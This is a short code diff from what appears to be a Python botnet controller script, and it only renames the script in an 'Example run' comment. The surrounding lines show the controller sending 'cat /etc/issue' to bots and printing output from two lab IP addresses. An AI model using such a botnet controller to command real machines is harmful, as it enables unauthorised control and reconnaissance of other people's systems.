@@ -64,7 +64,7 @@ botnetCommand('cat /etc/issue') # message/system identification
 '''
 Example run:
 
-attacker:∼# python botNet.py 
+attacker:∼# python BotnetWithBotArray.py 
 [*] Output from 10.10.10.110 
 [+] uname -v #1 SMP Fri Feb 17 10:34:20 EST 2012 
 [*] Output from 10.10.10.120 
